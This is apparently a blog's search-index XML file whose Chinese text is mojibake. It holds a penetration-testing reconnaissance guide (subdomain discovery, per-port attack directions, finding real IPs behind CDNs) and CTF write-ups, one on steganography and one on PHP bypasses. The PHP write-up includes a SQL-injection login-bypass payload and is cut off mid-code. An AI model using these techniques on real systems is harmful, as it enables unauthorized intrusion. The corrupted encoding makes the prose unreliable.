<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ä¿¡æ¯æ”¶é›†]]></title>
    <url>%2F2019%2F08%2F01%2Finformation-collection%2F</url>
    <content type="text"><![CDATA[1ã€åŸŸåä¿¡æ¯æ”¶é›†1.1whoisæŸ¥è¯¢å¯ä»¥é€šè¿‡çˆ±ç«™å·¥å…·ç½‘ï¼Œç«™é•¿ä¹‹å®¶ï¼ŒVirusTotalè¿™äº›ç½‘ç«™æŸ¥è¯¢åŸŸåçš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚åŸŸåæœåŠ¡å•†ï¼ŒåŸŸåæ‹¥æœ‰è€…ï¼Œä»¥åŠä»–ä»¬çš„é‚®ç®±ã€‚ç”µè¯ï¼Œåœ°å€ç­‰ kaliç³»ç»Ÿè‡ªå¸¦whoisã€‚è¯­æ³•å¦‚ä¸‹ whois æ‰€è¦æŸ¥è¯¢çš„åŸŸå 1.2ã€å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢ç½‘ç«™å¤‡æ¡ˆæ˜¯æŒ‡å‘ä¸»ç®¡æœºå…³æŠ¥å‘Šäº‹ç”±å­˜æ¡ˆä»¥å¤‡æŸ¥è€ƒã€‚è¡Œæ”¿æ³•è§’åº¦çœ‹å¤‡æ¡ˆï¼Œå®è·µä¸­ä¸»è¦æ˜¯ã€Šç«‹æ³•æ³•ã€‹å’Œã€Šæ³•è§„è§„ç« å¤‡æ¡ˆæ¡ä¾‹ã€‹çš„è§„å®šã€‚ç½‘ç«™å¤‡æ¡ˆçš„ç›®çš„å°±æ˜¯ä¸ºäº†é˜²æ­¢åœ¨ç½‘ä¸Šä»äº‹éæ³•çš„ç½‘ç«™ç»è¥æ´»åŠ¨ï¼Œæ‰“å‡»ä¸è‰¯äº’è”ç½‘ä¿¡æ¯çš„ä¼ æ’­ï¼Œå¦‚æœç½‘ç«™ä¸å¤‡æ¡ˆçš„è¯ï¼Œå¾ˆæœ‰å¯èƒ½è¢«æŸ¥å¤„ä»¥åå…³åœã€‚ å¸¸ç”¨ç½‘ç«™æœ‰2ä¸ªICPå¤‡æ¡ˆæŸ¥è¯¢ç½‘å¤©çœ¼æŸ¥ 1.3ã€æ•æ„Ÿä¿¡æ¯æ”¶é›†æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„å…³é”®å­—æ¥æ”¶é›†æ•æ„Ÿä¿¡æ¯Gooleçš„å¸¸ç”¨è¯­æ³•åŠå…¶è¯´æ˜ï¼Œï¼ˆå…¶ä»–æœç´¢å¼•æ“çš„è¯­æ³•å¤§åŒå°å¼‚ï¼‰| å…³é”®å­— | è¯´æ˜ || â€”â€”â€“ | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- || Site | æŒ‡å®šåŸŸå || Inurl | URLä¸­çš„å­˜åœ¨å…³é”®å­—çš„ç½‘é¡µ || Intext | ç½‘é¡µæ­£æ–‡ä¸­çš„å…³é”®å­— || Filetype | æŒ‡å®šæ–‡ä»¶ç±»å‹ || Intitle | ç½‘é¡µæ ‡é¢˜ä¸­çš„å…³é”®å­— || link | link:baidu.comå³è¡¨ç¤ºè¿”å›æ‰€æœ‰å’Œbaidu.comåšäº†è¿æ¥çš„URL || Info | æŸ¥æ‰¾ä¸€äº›æŒ‡å®šç«™ç‚¹çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ || cache | æœç´¢Gooleé‡Œå…³äºæŸäº›å†…å®¹çš„ç¼“å­˜ |å¦‚ï¼Œå…³é”®å­—çš„æ··åˆä½¿ç”¨è¿˜æœ‰burp suit çš„repeateråŠŸèƒ½ä¹Ÿå¯ä»¥è·å–åˆ°æœåŠ¡å™¨çš„ä¸€äº›ä¿¡æ¯ã€‚è¿˜å¯ä»¥é€šè¿‡ä¹Œäº‘æ¼æ´è¡¨æŸ¥è¯¢å†å²çš„æ¼æ´ä¿¡æ¯ 2ã€å­åŸŸåä¿¡æ¯æ”¶é›†2.1ã€å·¥å…·æ”¶é›†ä½¿ç”¨çš„å·¥å…·ä¸»è¦æœ‰Layerå­åŸŸåæŒ–æ˜æœºã€K8/wydomainç­‰ç­‰ï¼Œè¿™è¾¹æ¨èLayerå­åŸŸåæŒ–æ˜æœºï¼ŒSublist3rå’ŒsubDomainsBrute Layerå­åŸŸåæŒ–æ˜æœºæ“ä½œç®€å•ï¼Œå¦‚å›¾ subDomainsBruteéœ€è¦åœ¨python2çš„ç¯å¢ƒä¸‹ä½¿ç”¨,å…·ä½“çš„å¤§å®¶å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« å®ƒçš„ç‰¹ç‚¹æ˜¯å¯ä»¥å¿«é€Ÿçš„å‘ç°ä¸‰ã€å››ã€äº”ç­‰ä¸è¢«å®¹æ˜“æ¢æµ‹åˆ°çš„åŸŸå æ‰§è¡Œå‘½ä»¤ï¼š python subDomaisBrute.py xxx.com 2.2ã€æœç´¢å¼•æ“æšä¸¾å¦‚æœç´¢baiduæ——ä¸‹çš„å­åŸŸå 2.3ã€ä½¿ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡æšä¸¾å¾ˆå¤šç¬¬ä¸‰æ–¹æœåŠ¡æ±‡èšäº†å¤§é‡çš„DNSæ•°æ®é›†å¦‚DNSdumpsterç½‘ç«™ã€åœ¨çº¿DNSä¾¦æŸ¥å’Œæœç´¢çš„å·¥å…·æŒ–æ˜å‡ºæŒ‡å®šåŸŸæ½œåœ¨çš„å¤§é‡å­åŸŸå¦‚DNSdumpsterç½‘ç«™éƒ¨åˆ†ç»“æœ 2.4ã€è¯ä¹¦é€æ˜åº¦å…¬å¼€æ—¥å¿—æšä¸¾è¯ä¹¦é€æ˜åº¦ï¼ˆCTï¼‰æ˜¯è¯ä¹¦æˆæƒæœºæ„ï¼ˆCAï¼‰çš„ä¸€ä¸ªé¡¹ç›®ã€‚è¯ä¹¦æˆæƒæœºæ„ä¼šæŠŠæ¯ä¸ªSSL/TLSè¯ä¹¦å‘å¸ƒåˆ°å…¬å¼€æ—¥å¿—é‡Œï¼Œè¿™ä¸ªè¯ä¹¦é€šå¸¸åŒ…å«åŸŸåã€å­åŸŸåã€é‚®ä»¶åœ°å€ã€‚ç„¶è€ŒæŸ¥æ‰¾ä¸€äº›è¯ä¹¦æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯é€šè¿‡ä¸€ä¸‹æœç´¢å¼•æ“æœç´¢ä¸€äº›å…¬å¼€çš„CTæ—¥å¿—ã€‚ ä»‹ç»2ä¸ªç½‘ç«™ crt.sh å’Œ censysä¸‹å›¾ä¸ºcrtç½‘ç«™å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº›åœ¨çº¿ç½‘ç«™æŸ¥è¯¢å­åŸŸåï¼Œå¦‚IpåæŸ¥ç»‘å®šåŸŸåç½‘ç«™ï¼ˆå¯ä»¥æ ¹æ®åŸŸåæŸ¥è¯¢å…¶å¯¹åº”çš„IPåœ°å€å’ŒIPç‰©ç†åœ°å€ï¼Œå°±æ˜¯è¯´å¯ä»¥æŸ¥è¯¢è¯¥ç½‘ç«™çš„æœåŠ¡å™¨æ˜¯æ”¾åœ¨ä»€ä¹ˆåœ°æ–¹çš„ï¼Œä¸€æ ·å¯ä»¥ç²¾ç¡®åˆ°æŸä¸ªç½‘å§ï¼Œæœºæˆ¿æˆ–å­¦æ ¡ç­‰ã€‚ï¼‰ 3ã€æ”¶é›†å¸¸ç”¨ç«¯å£ä¿¡æ¯é€šè¿‡æ‰«ææœåŠ¡å™¨å¼€æ”¾çš„ç«¯å£ä»¥åŠä»è¯¥ç«¯å£ä¸Šåˆ¤æ–­æœåŠ¡å™¨å­˜åœ¨çš„æœåŠ¡ï¼Œå°±å¯ä»¥å¯¹ç—‡ä¸‹è¯ï¼Œä¾¿äºæˆ‘ä»¬æ¸—é€ç›®æ ‡æœåŠ¡å™¨å¸¸è§çš„å·¥å…·æœ‰nmapã€æ— çŠ¶æ€ç«¯å£æ‰«æå·¥å…·Masscanã€Zmapå’Œå¾¡å‰‘é«˜é€Ÿç«¯å£æ‰«æå·¥å…· å¸¸è§çš„ç«¯å£åŠå…¶è¯´æ˜ã€è¿˜æœ‰æ”»å‡»æ–¹å‘æ±‡æ€» 3.1æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 21/22/69 FTP/tftpæ–‡ä»¶çš„ä¼ è¾“åè®® å…è®¸åŒ¿åçš„ä¸Šä¼ ã€ä¸‹è½½ã€çˆ†ç ´å’Œå—…æ¢æ“ä½œ 2049 NfsæœåŠ¡ é…ç½®ä¸å½“ 139 SambaæœåŠ¡ çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ 389 Ldapç›®æ ‡æœåŠ¡åè®® æ³¨å…¥ã€å…è®¸åŒ¿åè®¿é—®ã€å¼±å£ä»¤ 3.2ã€è¿æ¥è¿œç¨‹æœåŠ¡ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 22 SHHè¿œç¨‹è¿æ¥ çˆ†ç ´ã€SHHéš§é“ä»¥åŠå†…ç½‘ä»£ç†çš„è½¬å‘å’Œå­˜å‚¨ã€æ–‡ä»¶ä¼ è¾“ 23 Telnetè¿œç¨‹è¿æ¥ çˆ†ç ´ã€å—…æ¢ã€å¼±å£ä»¤ 3389 Pdpè¿œç¨‹æ¡Œé¢è¿æ¥ shiftåé—¨ï¼ˆéœ€è¦windows Server 2003 ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼‰ã€çˆ†ç ´ 5900 VNC å¼±å£ä»¤çˆ†ç ´ 5632 PyAnywhereæœåŠ¡ æŠ“å¯†ç ã€ä»£ç æ‰§è¡Œ 3.3ã€webåº”ç”¨æœåŠ¡ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 80/443/8080 å¸¸è§çš„webæœåŠ¡å™¨ç«¯å£ webæ”»å‡»ã€çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´ 7001/7002 webLogicæ§åˆ¶å° javaååºåˆ—åŒ–ã€å¼±å£ä»¤ 8080/8089 Jboss/Resin/Jetty/Jenkins ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤ 9090 WebSphereæ§åˆ¶å° javaååºåˆ—åŒ–ã€å¼±å£ä»¤ 4848 GlassFishæ§åˆ¶å° å¼±å£ä»¤ 1352 Lotus domainé‚®ä»¶æœåŠ¡ å¼±å£ä»¤ã€ä¿¡æ¯æ³„éœ²ã€çˆ†ç ´ 10000 Webmin-Webæ§åˆ¶é¢æ¿ å¼±å£ä»¤ 3.4ã€æ•°æ®åº“æœåŠ¡ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 3306 MySQL æ³¨å…¥ã€ææƒã€çˆ†ç ´ 1433 MSSQLæ•°æ®åº“ æ³¨å…¥ã€ææƒã€çˆ†ç ´ã€SAå¼±å£ä»¤ 1521 Orcaleæ•°æ®åº“ TNSçˆ†ç ´ã€æ³¨å…¥ã€åå¼¹shell 5432 PostgreSQLæ•°æ®åº“ æ³¨å…¥ã€çˆ†ç ´ã€å¼±å£ä»¤ 27017/27018 MongoDB çˆ†ç ´ã€æœªæˆæƒçš„è®¿é—® 6397 Redisæ•°æ®åº“ å¯å°è¯•ä¸ºæˆæƒè®¿é—®ã€å¼±å£ä»¤çˆ†ç ´ 5000 Sysbase/DB2 çˆ†ç ´ã€æ³¨å…¥ 3.5ã€é‚®ä»¶æœåŠ¡ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 25 SMTPé‚®ä»¶æœåŠ¡ é‚®ä»¶ä¼ªé€  110 POP3åè®® çˆ†ç ´ã€å—…æ¢ 143 IMAPåè®® çˆ†ç ´ 3.6ã€ç½‘ç»œå¸¸è§åè®®ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 53 DNSåŸŸåç³»ç»Ÿ å…è®¸åŒºåŸŸä¼ é€ã€DNSåŠ«æŒã€ç¼“å­˜æŠ•æ¯’ã€æ¬ºéª— 67/68 DHCPæœåŠ¡ åŠ«æŒã€æ¬ºéª— 161 SNMPåè®® çˆ†ç ´ã€æ”¶é›†ç›®æ ‡å†…ç½‘ä¿¡æ¯ 3.7ã€ç‰¹æ®ŠæœåŠ¡ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 2811 ZookeeperæœåŠ¡ æœªæˆæƒè®¿é—® 8069 ZabbixæœåŠ¡ è¿œç¨‹æ‰§è¡Œã€SQLæ³¨å…¥ 9200/9300 ElasticsearchæœåŠ¡ è¿œç¨‹æ‰§è¡Œ 11211 Memcache æœªæˆæƒè®¿é—® 512/513/514 Linux RexecæœåŠ¡ çˆ†ç ´ã€Rloginç™»å½• 873 RsyncæœåŠ¡ åŒ¿åè®¿é—®ã€æ–‡ä»¶ä¸Šä¼  3690 SvnæœåŠ¡ Svnæ³„éœ²ã€æœªæˆæƒè®¿é—® 50000 SAP Management Console è¿œç¨‹æ‰§è¡Œ 4ã€CMSè¯†åˆ«åœ¨è¿›è¡Œæ¸—é€æ—¶å¾—è¯†åˆ«å‡ºç›¸åº”çš„webå®¹å™¨æˆ–CMSæ‰å¯ä»¥è¿›è¡Œæ¸—é€ CMSæ˜¯Content Management Systemçš„ç¼©å†™ï¼Œæ„ä¸ºâ€å†…å®¹ç®¡ç†ç³»ç»Ÿâ€ã€‚ å†…å®¹ç®¡ç†ç³»ç»Ÿæ˜¯ä¼ä¸šä¿¡æ¯åŒ–å»ºè®¾å’Œç”µå­æ”¿åŠ¡çš„æ–°å® ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç›¸å¯¹è¾ƒæ–°çš„å¸‚åœºã€‚ä¸šç•Œå…¬è®¤çš„å›½å†…æ¯”è¾ƒæƒå¨çš„äº§å“æœ‰CmsTopã€TurboCMSã€TRSã€‚å¯¹äºå†…å®¹ç®¡ç†ï¼Œä¸šç•Œè¿˜æ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€çš„å®šä¹‰ï¼Œä¸åŒçš„æœºæ„æœ‰ä¸åŒçš„ç†è§£ã€‚ å¸¸è§çš„CMSæœ‰Dedecms(ç»‡æ¢¦)ã€Discuzã€PHPWEBã€PHPWindã€PHPCMSã€ECShopã€Dvbbsã€SiteWeaverã€ASPCMSã€å¸å›½ã€Z-Blogã€WordPressç­‰ ä»£è¡¨å·¥å…·æœ‰å¾¡å‰‘WebæŒ‡çº¹è¯†åˆ«ï¼ŒwhatWebã€WebRoboã€æ¤°æ ‘ã€è½»é‡WEBæŒ‡çº¹è¯†åˆ«ç­‰ï¼Œå¯ä»¥å¿«é€Ÿè¯†åˆ«ä¸€äº›ä¸»æµçš„CMS åœ¨çº¿ç½‘ç«™æŸ¥è¯¢CMSæŒ‡çº¹è¯†åˆ«æœ‰ï¼šBugScanneräº‘æ‚‰æŒ‡çº¹å’ŒWhatWeb 5ã€æŸ¥æ‰¾çœŸå®IP5.1ã€ç›®æ ‡æœåŠ¡å™¨å­˜åœ¨CDNè‹¥ç›®æ ‡æœåŠ¡å™¨ä¸å­˜åœ¨CDN,é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ip138ç½‘æ¥è·å–ç›®æ ‡çš„ä¸€äº›IPåŠå…¶åŸŸåä¿¡æ¯ã€‚ä½†æ˜¯ä¸€èˆ¬æ˜¯å­˜åœ¨CDNçš„ ä»€ä¹ˆæ˜¯CDNå‘¢CDNå…¨ç§°:Content Delivery Networkæˆ–Content Ddistribute Networkï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œå°½å¯èƒ½é¿å¼€äº’è”ç½‘ä¸Šæœ‰å¯èƒ½å½±å“æ•°æ®ä¼ è¾“é€Ÿåº¦å’Œç¨³å®šæ€§çš„ç“¶é¢ˆå’Œç¯èŠ‚ï¼Œä½¿å†…å®¹ä¼ è¾“çš„æ›´å¿«ã€æ›´ç¨³å®šã€‚é€šè¿‡åœ¨ç½‘ç»œå„å¤„æ”¾ç½®èŠ‚ç‚¹æœåŠ¡å™¨æ‰€æ„æˆçš„åœ¨ç°æœ‰çš„äº’è”ç½‘åŸºç¡€ä¹‹ä¸Šçš„ä¸€å±‚æ™ºèƒ½è™šæ‹Ÿç½‘ç»œï¼ŒCDNç³»ç»Ÿèƒ½å¤Ÿå®æ—¶åœ°æ ¹æ®ç½‘ç»œæµé‡å’Œå„èŠ‚ç‚¹çš„è¿æ¥ã€è´Ÿè½½çŠ¶å†µä»¥åŠåˆ°ç”¨æˆ·çš„è·ç¦»å’Œå“åº”æ—¶é—´ç­‰ç»¼åˆä¿¡æ¯å°†ç”¨æˆ·çš„è¯·æ±‚é‡æ–°å¯¼å‘ç¦»ç”¨æˆ·æœ€è¿‘çš„æœåŠ¡èŠ‚ç‚¹ä¸Šã€‚ å¦‚æœæ¸—é€ç›®æ ‡å…·æœ‰CDNæœåŠ¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬pingç›®æ ‡åŸŸåå¾—åˆ°çš„åªæ˜¯ç¦»æˆ‘ä»¬æœ€è¿‘çš„ä¸€å°èŠ‚ç‚¹çš„CDNæœåŠ¡å™¨çš„IP,ä¸æ˜¯æœåŠ¡å™¨çš„çœŸå®IP,é‚£ä¹ˆæˆ‘ä»¬è¦æ€æ ·è·å–ç›®æ ‡æœåŠ¡å™¨çœŸå®çš„IPå‘¢ 5.2ã€åˆ¤æ–­ç›®æ ‡æ˜¯å¦ä½¿ç”¨äº†CDNå¯ä»¥é€šè¿‡pingç›®æ ‡åŸŸåæ¥åˆ¤æ–­ï¼Œå¦‚ä¸‹å›¾å¯ä»¥å‘ç°baiduæœåŠ¡å™¨å­˜åœ¨CDNæœåŠ¡ 5.3ã€ç»•è¿‡CDNå¯»æ‰¾çœŸå®çš„IPä»‹ç»ä¸€äº›å¸¸è§„çš„æ–¹æ³• 1ã€å†…éƒ¨é‚®ç®±æºã€‚ä¸€èˆ¬çš„é‚®ç®±ç³»ç»Ÿåœ¨å†…éƒ¨ï¼Œæ²¡æœ‰ç»è¿‡CDNè§£æã€‚æ•…å¯ä»¥pingé‚®ç®±æœåŠ¡å™¨çš„åŸŸåï¼Œå¿…é¡»æ˜¯ç›®æ ‡è‡ªå·±çš„é‚®ç®±æœåŠ¡å™¨ï¼Œä¸æ˜¯ç¬¬ä¸‰æ–¹æˆ–è€…å…¬å…±é‚®ç®±æœåŠ¡å™¨ã€‚ 2ã€æ‰«æç½‘ç«™æµ‹è¯•æ–‡ä»¶ï¼Œå¦‚phpinfoï¼Œteste=ç­‰ 3ã€åˆ†ç«™åŸŸåã€‚ä¸€èˆ¬æ¥è¯´ä¸»æˆ˜çš„è®¿é—®é‡æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥æ˜¯ä¸»å¼ æŒ‚CDN,åˆ†ç«™å¯èƒ½æ²¡æœ‰æŒ‚ã€‚é€šè¿‡pingäºŒçº§åŸŸåè·å–åˆ†ç«™IP,ä»è€Œ1æ¨æµ‹ä¸»ç«™IP 4ã€å›½å¤–è®¿é—®ã€‚ä¸€èˆ¬æ¥è¯´å›½å†…çš„CDNåªå¯¹å›½å†…çš„ç”¨æˆ·è®¿é—®åŠ é€Ÿï¼Œå¯¹å›½å¤–å°±ä¸ä¸€å®šäº†ã€‚å¯ä»¥é€šè¿‡å›½å¤–åœ¨çº¿ä»£ç†ç½‘ç«™App Synthetic Monitorè®¿é—®,å¯èƒ½ä¼šå¾—åˆ°çœŸå®IP 5ã€æŸ¥çœ‹åŸŸåè§£æè®°å½• 6ã€å¦‚æœç›®æ ‡ç½‘ç«™æœ‰è‡ªå·±çš„App,é€šè¿‡æŠ“åŒ…å·¥å…·æŠ“å–Appçš„è¯·æ±‚ï¼Œä»è€Œæ‰¾åˆ°çœŸå®IP 7ã€é€šè¿‡CloudFlareWatchåœ¨çº¿ç½‘ç«™æŸ¥æ‰¾çœŸå®IP 5.4ã€å¦‚ä½•éªŒè¯IPçš„çœŸå®æ€§ å¯ä»¥æ‰‹å·¥ç›´æ¥è®¿é—®ipçœ‹å“åº”é¡µé¢æ˜¯å¦ä¸è®¿é—®åŸŸåè¿”å›çš„é¡µé¢ä¸€æ ·ã€‚ä¹Ÿå¯ä»¥é€šè¿‡å·¥å…·æ‰¹é‡è®¿é—®ï¼Œå¦‚Masscanç­‰å·¥å…·ã€‚ 6ã€æ•æ„Ÿç›®å½•æ–‡ä»¶æ”¶é›†é’ˆå¯¹ç½‘ç«™æ‰«æå·¥å…·ï¼Œä¸»è¦æœ‰DirBusterã€å¾¡å‰‘åå°æ‰«æçè—ç‰ˆã€wwwscanã€Spinderã€Sensitivefilescanã€Weakfilescanç­‰ åœ¨çº¿å·¥ä½œç«™æœ‰webSacnç­‰ä¸‹é¢æ˜¯DirBusterå­˜åœ¨ç•Œé¢ï¼Œéœ€è¦javaç¯å¢ƒBrowseæ˜¯é€‰æ‹©è‡ªå·±çš„å­—å…¸ä¹Ÿå¯ä»¥é€‰æ‹©å·¥å…·è‡ªå¸¦çš„å­—æ®µï¼Œè€Œlist infoæ˜¯é€‰æ‹©è‡ªå·±çš„å­—å…¸ å¯¹æœ€åä¸€ä¸ªçº¢æ¡†è¿›è¡Œè¯´æ˜ï¼Œå¦‚æœä½ é€‰æ‹©æ‰«æçš„ç›®å½•ä¸ºhttp://www.wedd.com/admin/,é‚£ä¹ˆåœ¨URL to fuzzé‡Œä¹…æœ‰å†™ä¸Šâ€œ/admin/{dir}â€,åœ¨{dir}å‰åéƒ½å¯ä»¥éšæ„æ‹¼æ¥ä½ æƒ³è¦çš„ç›®å½•æˆ–åç¼€]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019ISCC misc ç¬¬2/4/7é¢˜]]></title>
    <url>%2F2019%2F08%2F01%2F2019ISCC-misc-%E7%AC%AC2-4-7%E9%A2%98%2F</url>
    <content type="text"><![CDATA[ç¬¬2é¢˜ï¼šä¸‹è½½é™„ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶åç¼€åä¸ºzipï¼Œå‘ç°50ä¸ªäºŒç»´ç ã€‚å‘ç°æœ€åä¸€å¼ äºŒç»´ç ï¼Œæ ¼å¼ä¸ºjpgä¸å…¶ä»–äºŒç»´ç éƒ½ä¸ä¸€æ ·ã€‚ç”¨winhexæ‰“å¼€ï¼Œå‘ç°flagã€‚æ³¨æ„è¿™è¾¹æœ‰ä¸ªå‘ï¼Œflagæäº¤æ—¶è¦æŠŠflag{}å»æ‰ã€‚ ç¬¬4é¢˜ï¼šä¸‹è½½é™„ä»¶æ˜¯ä¸€ä¸ªåŠ¨æ€çš„jpg,ä½¿ç”¨winhexæ‰“å¼€åœ¨æœ«å°¾å‘ç°ç–‘æ˜¯base64åŠ å¯†ï¼Œæ‹¿å»åœ¨çº¿è§£å¯†ï¼Œå¾—åˆ°Salted__P)=N6q(Ñl%.,D7Ûî‡Õº?1Câ€™ÎªÉ’~`à§µÜ‹ß–ß„zgF4_1Î¶$wOkÌ†ÓŠ$Ã”jç¼Ìâ¾*!nã€‚æ€€ç–‘æ˜¯ASEåŠ å¯†è‡³äºä»€ä¹ˆæ˜¯ASEåŠ å¯†è¯·çœ‹è¿™ç¯‡åšå®¢ç›´æ¥è§£å¯†å‘ç°è§£å¯†ä¸äº†ã€‚ASEåœ¨çº¿è§£å¯†çŒœæƒ³å¯†é’¥æ˜¯ISCC,è¿ç»­è§£å¯†2æ¬¡å‘ç°flag ç¬¬7é¢˜ä¸‹è½½å‹ç¼©åŒ…å‘ç°ï¼Œå›¾ç‰‡æŸåï¼Œæ‰“å¼€winhexä¿å­˜å³å¯å¾—åˆ°æ­£å¸¸çš„pngå›¾ç‰‡ã€‚ä¿®æ”¹åç¼€åä¸ºzip,hè·å¾—éŸ³é¢‘æ–‡ä»¶ã€‚æ‰“å¼€pngå›¾ç‰‡æ‰«æä¸ºå½“é“ºå¯†ç ï¼Œåœ¨çº¿è§£ç ï¼šhttp://www.zjslove.com/3.decode/dangpu/index.html ä½•ä¸ºå½“é“ºå¯†ç ï¼šç®€å•è¯´å°±æ˜¯å½“å‰æ±‰å­—æœ‰å¤šå°‘ç¬”ç”»å‡ºå¤´ï¼Œå°±æ˜¯è½¬åŒ–æˆæ•°å­—å‡ ã€‚ ç„¶åæˆ‘ä»¬ä½¿ç”¨MP3Stegoå·¥å…·è¿›è¡ŒéŸ³é¢‘éšå†™çš„è§£å¯†ï¼Œ-Xåé¢ä¸ºè¦è§£å¯†çš„éŸ³é¢‘æ–‡ä»¶ï¼Œ-Påé¢ä¸ºå¯†ç ï¼ˆè¦æŠŠéŸ³é¢‘æ–‡ä»¶æ”¾åœ¨Decode.exeçš„åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶è§£å‹éœ€è¦å¯†ç ï¼‰æ‰“å¼€01.MP3.txtï¼Œå‘ç°é‡Œé¢ä¸º&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#80;&amp;#114;&amp;#69;&amp;#116;&amp;#84;&amp;#121;&amp;#95;&amp;#49;&amp;#83;&amp;#99;&amp;#67;&amp;#57;&amp;#48;&amp;#49;&amp;#50;&amp;#95;&amp;#103;&amp;#79;&amp;#48;&amp;#100;&amp;#125;è¿›è¡Œ10è¿›åˆ¶è½¬asciiç å³å¯å¾—åˆ°flag.]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[strposæ•°ç»„ç»•è¿‡ï¼Œå¯†ç MD5æ¯”è¾ƒç»•è¿‡,MD5å‡½æ•°===ç»•è¿‡]]></title>
    <url>%2F2019%2F08%2F01%2Fstrpos%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%EF%BC%8C%E5%AF%86%E7%A0%81MD5%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87-MD5%E5%87%BD%E6%95%B0-%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[ä¸€ã€strposæ•°ç»„ç»•è¿‡NULL&lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&apos;nctf&apos;])) { if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE) echo &apos;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&apos;; else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&apos;; } ?&gt; å®šä¹‰å’Œç”¨æ³•strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ å®ƒä¸èƒ½å¯¹æ•°ç»„å¤„ç†ï¼Œå¦‚æœæ˜¯æ•°ç»„åˆ™è¿”å›null,nullï¼Œä¹Ÿå°±ä¸ç­‰äºFALSE.payloadä¸º?nctf[]=1 äºŒã€å¯†ç md5æ¯”è¾ƒç»•è¿‡&lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos; $user &apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) { â€‹ echo â€œLogged in! Key: ntcf{**} â€œ; } else { echo(â€œLog in failure!â€œ); } } ?&gt; å®¡è®¡æºç å¯çŸ¥ï¼Œè¦æƒ³å¾—åˆ°flagï¼Œåªéœ€è¦åŒæ—¶æ»¡è¶³ ($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])) $userå˜é‡æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œç„¶ååˆæ²¡æœ‰ä»»ä½•è¿‡æ»¤æªæ–½æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªè¯­å¥é€‰æ‹©ä¸€ä¸ªç›¸åº”çš„å¯†ç ç»™å¯¹åº”çš„pw å¦‚æœå‰é¢çš„ç”¨æˆ·åä¸å­˜åœ¨çš„è¯mysql_fetch_array(mysql_query(â€œselect pw from ctf where user=â€™$userâ€™â€));å–åˆ°çš„ä¸œè¥¿å°±æ˜¯ç©ºï¼Œç„¶ååœ¨åŠ ä¸Šæˆ‘ä»¬çš„md5å¯†ç ï¼Œå°±å¯ä»¥å®ç°æˆåŠŸç™»é™† strcasecmpå‡½æ•°ï¼Œæ¯”è¾ƒ2ä¸ªå­—ç¬¦ä¸²ï¼Œä¸åŒºåˆ†å¤§å°å†™ã€‚å¦‚æœ2ä¸ªå­—ç¬¦ä¸²å¤§å°ç›¸ç­‰å°±è¿”å›0ã€‚ æœ€åpayloaduser=1â€™ union select md5(1)%23&amp;pass=1 ä¸‰ã€MD5å‡½æ•°===ç»•è¿‡&lt;?php error_reporting(0); $flag = &apos;flag{test}&apos;; if (isset($_GET[&apos;username&apos;]) and 